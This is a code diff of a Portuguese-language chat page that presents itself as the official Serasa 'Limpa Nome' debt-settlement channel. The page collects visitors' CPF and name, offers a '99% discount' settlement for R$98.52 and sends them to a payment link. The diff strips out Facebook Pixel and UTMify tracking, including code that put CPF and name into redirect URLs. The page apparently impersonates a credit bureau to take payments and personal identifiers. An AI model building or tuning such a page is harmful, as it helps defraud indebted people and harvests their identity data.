@@ -5,84 +5,18 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Feirão Serasa - Atendimento</title>
 
-<!-- 1. PRIMEIRO: Script UTMify para garantir que carregue primeiro -->
+<!-- 1. APENAS O UTMIFY - Ele já cuida de tudo -->
 <script src="scripts/utms/latest-1.js" data-utmify-prevent-subids="" async defer></script>
 <script>
-  window.pixelId = "6939d79855be7738fa1fec49";
-  
-  // Aguarda o DOM estar pronto para carregar o pixel UTMify
-  document.addEventListener('DOMContentLoaded', function() {
-    var a = document.createElement("script");
-    a.setAttribute("async", "");
-    a.setAttribute("defer", "");
-    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-    document.head.appendChild(a);
-    
-    console.log('Pixel UTMify carregado');
-  });
+      window.pixelId = "6939d79855be7738fa1fec49";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
 </script>
 
-<!-- 2. SEGUNDO: Facebook Pixel com melhor controle de timing -->
-<script>
-  !function(f,b,e,v,n,t,s){
-    if(f.fbq)return;
-    n=f.fbq=function(){
-      n.callMethod ? n.callMethod.apply(n,arguments) : n.queue.push(arguments)
-    };
-    if(!f._fbq) f._fbq = n;
-    n.push = n;
-    n.loaded = !0;
-    n.version = '2.0';
-    n.queue = [];
-    t = b.createElement(e);
-    t.async = !0;
-    t.src = v;
-    s = b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s);
-  }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
-  
-  // Inicializa o pixel COM TIMEOUT para garantir UTMify
-  setTimeout(function() {
-    fbq('init', '769736156134629');
-    console.log('Facebook Pixel inicializado');
-    
-    // Aguarda UTMify ou dispara após timeout de segurança
-    if (typeof utmify !== 'undefined') {
-      console.log('UTMify detectado, trackeando PageView');
-      fbq('track', 'PageView');
-      
-      // Trackeia evento de visualização do chat
-      fbq('track', 'ViewContent', {
-        content_name: 'Serasa Limpa Nome Chat',
-        content_category: 'Financial Services',
-        content_type: 'product'
-      });
-    } else {
-      // Se UTMify não carregar em 3 segundos, dispara mesmo assim
-      setTimeout(function() {
-        console.log('UTMify não detectado, trackeando sem UTM');
-        fbq('track', 'PageView');
-        fbq('track', 'ViewContent', {
-          content_name: 'Serasa Limpa Nome Chat',
-          content_category: 'Financial Services',
-          content_type: 'product'
-        });
-      }, 3000);
-    }
-  }, 1000);
-  
-  // Event listener alternativo para UTMify
-  document.addEventListener("utmify-loaded", function() {
-    console.log('UTMify carregado via event listener');
-    fbq('track', 'PageView');
-  });
-</script>
-
-<noscript>
-  <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=769736156134629&ev=PageView&noscript=1"/>
-</noscript>
-
-<!-- Config do pixel face + utm -->
+<!-- Configurações de estilo (mantidas) -->
 <link rel="icon" type="image/x-icon" href="../../1_6vufYTynT97AiH9uOytFpw.png">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -700,101 +634,21 @@
 
 <script>
 // ==============================================
-// FUNÇÕES DE TRACKING MELHORADAS
+// FUNÇÕES PRINCIPAIS
 // ==============================================
 
-// Função para capturar TODOS os parâmetros UTM da URL atual
-function getAllUrlParams() {
-  const params = new URLSearchParams(window.location.search);
-  const allParams = {};
+// FUNÇÃO PARA REDIRECIONAMENTO COM PARÂMETROS UTM
+function redirecionarComUtm(url) {
+  // Pega todos os parâmetros da URL atual
+  const params = window.location.search;
+  // Se já tiver parâmetros na URL de destino, adiciona corretamente
+  const separator = url.includes('?') ? '&' : '?';
+  // Monta a URL final com todos os parâmetros
+  const urlFinal = params ? url + separator + params.substring(1) : url;
   
-  // Captura todos os parâmetros da URL
-  for (const [key, value] of params.entries()) {
-    allParams[key] = value;
-  }
-  
-  return allParams;
+  console.log('Redirecionando para:', urlFinal);
+  window.location.href = urlFinal;
 }
-
-// Função para construir URL com parâmetros UTM preservados
-function buildUrlWithUtm(baseUrl) {
-  const params = getAllUrlParams();
-  const url = new URL(baseUrl);
-  
-  // Adiciona TODOS os parâmetros UTM à nova URL
-  for (const [key, value] of Object.entries(params)) {
-    // Preserva apenas parâmetros importantes para tracking
-    if (key.includes('utm_') || key.includes('fbclid') || key.includes('gclid') || 
-        key.includes('ttclid') || key === 'campaign' || key === 'source' || 
-        key === 'medium' || key === 'content' || key === 'term') {
-      url.searchParams.set(key, value);
-    }
-  }
-  
-  // Adiciona também os dados do usuário se disponíveis
-  if (userCPF) {
-    url.searchParams.set('cpf', userCPF);
-  }
-  if (userName) {
-    url.searchParams.set('nome', encodeURIComponent(userName));
-  }
-  
-  // Adiciona timestamp para evitar cache
-  url.searchParams.set('_t', Date.now());
-  
-  console.log('URL gerada com UTM:', url.toString());
-  return url.toString();
-}
-
-// Função para trackear eventos do Facebook
-function trackFacebookEvent(eventName, parameters = {}) {
-  if (typeof fbq !== 'undefined') {
-    // Adiciona parâmetros UTM ao evento
-    const utmParams = getAllUrlParams();
-    const eventData = {
-      ...parameters,
-      ...utmParams // Inclui todos os parâmetros UTM no evento
-    };
-    
-    fbq('track', eventName, eventData);
-    console.log('Facebook Event tracked:', eventName, eventData);
-    
-    // Também envia para o UTMify se disponível
-    if (typeof utmify !== 'undefined' && utmify.track) {
-      try {
-        utmify.track(eventName, eventData);
-        console.log('UTMify Event tracked:', eventName);
-      } catch (e) {
-        console.log('Erro ao trackear no UTMify:', e);
-      }
-    }
-  }
-}
-
-// Função para trackear clique no botão de pagamento
-function trackPaymentClick() {
-  const utmParams = getAllUrlParams();
-  
-  trackFacebookEvent('InitiateCheckout', {
-    content_name: 'Serasa Limpa Nome Payment',
-    content_category: 'Financial Services',
-    value: 98.52,
-    currency: 'BRL',
-    ...utmParams // Passa todos os UTMs
-  });
-  
-  trackFacebookEvent('AddToCart', {
-    content_name: 'Serasa Acordo 99% Desconto',
-    content_type: 'product',
-    value: 98.52,
-    currency: 'BRL',
-    ...utmParams
-  });
-}
-
-// ==============================================
-// FUNÇÕES DO CHAT (MANTIDAS)
-// ==============================================
 
 // Função para obter CPF e NOME da URL
 function getDataFromURL() {
@@ -807,9 +661,6 @@ function getDataFromURL() {
 
 // Verificar se já tem CPF e Nome na URL
 const urlData = getDataFromURL();
-console.log('CPF da URL:', urlData.cpf);
-console.log('Nome da URL:', urlData.nome);
-console.log('Todos os parâmetros da URL:', getAllUrlParams());
 
 // Dados do usuário
 let userCPF = '';
@@ -900,7 +751,7 @@ function addMessage(text, type = 'bot', sender = '', media = '') {
   return messageDiv;
 }
 
-// Função para mostrar botões - AGORA COM UTM PRESERVADO
+// Função para mostrar botões - COM REDIRECIONAMENTO CORRETO
 function showButtons(buttons) {
   const messagesContainer = document.getElementById('messages');
   const buttonsContainer = document.createElement('div');
@@ -919,17 +770,6 @@ function showButtons(buttons) {
       
       addMessage(button.text, 'user');
       
-      // TRACKEAR CLIQUE NO BOTÃO
-      if (button.text.includes('PAGAR') || button.redirectUrl) {
-        trackPaymentClick();
-      }
-      
-      // Trackeia evento genérico de clique
-      trackFacebookEvent('CustomizeProduct', {
-        content_name: button.text,
-        content_category: 'Button Click'
-      });
-      
       document.querySelectorAll('.buttons-container').forEach(el => {
         el.style.opacity = '0';
         el.style.transform = 'translateY(-10px)';
@@ -939,23 +779,8 @@ function showButtons(buttons) {
       // VERIFICA SE TEM REDIRECT URL
       if (button.redirectUrl) {
         setTimeout(() => {
-          // Trackeia o clique final ANTES do redirecionamento
-          const utmParams = getAllUrlParams();
-          
-          trackFacebookEvent('Purchase', {
-            value: 98.52,
-            currency: 'BRL',
-            content_name: 'Serasa Limpa Nome - Acordo Completo',
-            content_type: 'product',
-            transaction_id: 'SERASA-' + Date.now(),
-            ...utmParams // Passa todos os UTMs para a compra
-          });
-          
-          // AGORA: Gera URL com UTM preservado
-          const finalUrl = buildUrlWithUtm(button.redirectUrl);
-          console.log('Redirecionando para:', finalUrl);
-          
-          window.location.href = finalUrl;
+          // USANDO A FUNÇÃO CORRETA PARA REDIRECIONAR COM UTM
+          redirecionarComUtm(button.redirectUrl);
         }, 1000);
       } else {
         setTimeout(() => {
@@ -1067,15 +892,6 @@ async function validateData(inputData = null) {
   // SALVA OS DADOS DO USUÁRIO
   userCPF = cpf;
   userName = nome;
-  console.log('Dados salvos:', { nome: userName, cpf: userCPF });
-  
-  // Trackeia o preenchimento do formulário
-  const utmParams = getAllUrlParams();
-  trackFacebookEvent('CompleteRegistration', {
-    content_name: 'Serasa Form Completed',
-    status: 'completed',
-    ...utmParams
-  });
   
   const inputContainer = document.querySelector('.cpf-input-container');
   if (inputContainer) {
@@ -1441,7 +1257,6 @@ async function processStep(stepId) {
     // Se for um passo de áudio, aguardar a duração do áudio antes de prosseguir
     if (step.audioStep) {
       const audioDuration = audioDurations[step.audioFile] || 5;
-      console.log(`Aguardando ${audioDuration} segundos (duração do áudio ${step.audioFile})...`);
       
       setTimeout(() => {
         processStep(stepId + 1);
@@ -1571,7 +1386,6 @@ async function processStep(stepId) {
 function startFlowBasedOnData() {
   if (urlData.cpf && isValidCPF(urlData.cpf) && urlData.nome && !dataFromURLProcessed) {
     dataFromURLProcessed = true;
-    console.log('Dados da URL detectados, validando...');
     
     setTimeout(() => {
       addMessage('Bem-vindo ao canal oficial Serasa Limpa Nome!', 'bot', 'Bot Serasa', `
